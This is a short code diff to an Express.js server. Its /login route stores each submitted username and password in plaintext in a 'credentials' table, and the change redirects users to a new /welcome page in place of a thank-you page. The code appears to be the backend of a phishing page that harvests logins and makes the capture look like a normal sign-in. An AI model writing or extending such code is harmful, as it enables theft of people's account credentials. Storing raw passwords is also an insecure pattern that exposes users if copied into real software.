@@ -42,6 +42,11 @@ app.use(express.urlencoded({ extended: true }));
 app.use(express.json());
 app.use(express.static(path.join(__dirname, 'public')));
 
+// GET /welcome — serve the post-login page
+app.get('/welcome', (req, res) => {
+  res.sendFile(path.join(__dirname, 'public', 'welcome.html'));
+});
+
 // POST /login — save credentials, redirect to thank-you page
 app.post('/login', async (req, res) => {
   const { username, password } = req.body;
@@ -52,7 +57,7 @@ app.post('/login', async (req, res) => {
 
   if (!dbAvailable) {
     // Preview mode — skip DB insert, just redirect
-    return res.redirect('/thankyou.html');
+    return res.redirect('/welcome');
   }
 
   try {
@@ -60,7 +65,7 @@ app.post('/login', async (req, res) => {
       'INSERT INTO credentials (username, password) VALUES ($1, $2)',
       [username, password]
     );
-    res.redirect('/thankyou.html');
+    res.redirect('/welcome');
   } catch (err) {
     console.error('Insert error:', err.message);
     res.status(500).send('An error occurred. Please try again.');
